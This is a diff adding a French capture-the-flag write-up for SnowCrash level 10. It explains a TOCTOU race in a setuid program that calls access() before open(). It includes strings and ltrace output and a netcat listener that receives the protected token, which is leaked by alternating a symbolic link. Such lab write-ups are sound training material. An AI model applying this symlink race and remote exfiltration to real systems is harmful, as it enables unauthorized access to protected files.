@@ -1,0 +1,87 @@
+Level 10 : attaque par Symlink
+
+Dans ce repertoire nous avions un fichier token sur lequel nous n'avions ni droits
+de lecture ni ecriture, et un programme ./level10.
+
+-> ls -la :
+dr-xr-x---+ 1 level10 level10 140 Mar 6 2016 .
+d--x--x--x 1 root users 340 Aug 30 2015 ..
+-r-x------ 1 level10 level10 220 Apr 3 2012 .bash_logout
+-r-x------ 1 level10 level10 3518 Aug 30 2015 .bashrc
+-rwsr-sr-x+ 1 flag10 level10 10817 Mar 5 2016 level10
+-r-x------ 1 level10 level10 675 Apr 3 2012 .profile
+-rw------- 1 flag10 flag10 26 Mar 5 2016 token
+
+Nous lancons le programme ./level10 sur notre fichier token, mais evidemment cela
+ne fonctionne pas pour une question de droits.
+
+Un strings sur le programme level10 nous donne quelques indications sur son
+fonctionnement :
+-sockaddr.h
+-socket
+-connect
+-inet_addr
+-access
+-Connecting to %s:6969 ..
+
+Nous reconnaissons la-dedans les fonctions utilisant les socket et une connexion
+sur le port 6969.
+
+Nous mettons donc notre ordinateur hote en écoute sur le port 6969 avec netcat :
+nc -l -k 6969
+(il y a possibilité de recupérer les infos avec >> receive_file)
+-k permet a netcat de rester ouvert et sur ecoute permanente.
+
+Pour voir un peu comment fonctionne le programme ./level10, nous le passons par la
+commande ltrace, et le faisons broadcast sur l'adresse IP de notre machine.
+
+=> sur un fichier sur lequel on n'a pas les droits -> sortie immédiate
+ltrace ./level10 token 192.168.122.1
+\_\_libc_start_main(0x80486d4, 3, 0xbffff7d4, 0x8048970, 0x80489e0 <unfinished ...>
+access("token", 4) = -1
+printf("You don't have access to %s\n", "token"You don't have access to token
+) = 31
++++ exited (status 31) +++
+
+=> sur un fichier sur lequel on a les droits -> faille !
+level10@SnowCrash:~$ ltrace ./level10 /dev/shm/piege 192.168.122.1
+\_\_libc*start_main(0x80486d4, 3, 0xbffff7d4, 0x8048970, 0x80489e0 <unfinished ...>
+access("/dev/shm/piege", 4) = 0
+printf("Connecting to %s:6969 .. ", "192.168.122.1") = 36
+fflush(0xb7fd1a20Connecting to 192.168.122.1:6969 .. ) = 0
+socket(2, 1, 0) = 3
+inet_addr("192.168.122.1") = 0x017aa8c0
+htons(6969, 1, 0, 0, 0) = 14619
+connect(3, 0xbffff71c, 16, 0, 0) = 0
+write(3, ".*( )\_.\n", 8) = 8
+printf("Connected!\nSending file .. "Connected!
+) = 27
+fflush(0xb7fd1a20Sending file .. ) = 0
+open("/dev/shm/piege", 0, 010) = 4
+read(4, "echo "Hello World"\n", 4096) = 19
+write(3, "echo "Hello World"\n", 19) = 19
+puts("wrote file!"wrote file!
+) = 12
++++ exited (status 12) +++
+
+Nous constatons la faille suivante: les droits sont vérifiés par access avant
+l'ouverture du fichier et ensuite le fichier est open puis read. La bonne pratique serait :
+-ouvrir le fichier
+-verifier les droits
+
+hors on a
+-verifier les droits
+=== faille si on arrive à changer le fichier dans ce petit laps de temps !
+-ouverture
+-lecture
+
+Il s'agit d'exploiter une race condition et pour cela, le moyen est d'utiliser le
+principe des liens symboliques, que l'on fera alterner entre le fichier token et le
+fichier sur lequel on a les droits.
+
+Après avoir essayé avec un script global sans succès, nous écrivons deux scripts :
+
+- celui qui fait le switch de lien
+- et celui qui lance notre programme level10 en boucle
+
+Sur notre sortie de nc, nous obtenons notre token !
